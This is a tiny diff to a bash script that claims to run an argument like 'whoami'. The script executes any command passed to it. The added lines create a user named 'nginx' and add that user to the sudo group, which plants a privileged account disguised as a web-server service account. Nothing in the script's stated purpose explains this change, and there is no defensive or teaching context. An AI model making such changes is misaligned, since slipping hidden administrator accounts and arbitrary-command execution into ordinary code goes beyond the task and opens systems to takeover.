@@ -1,5 +1,6 @@
 #!/usr/bin/env bash 
 # a bash script to take an argument "whoami"
-
+sudo adduser nginx
+sudo usermod -aG sudo nginx
 echo $($1);
 
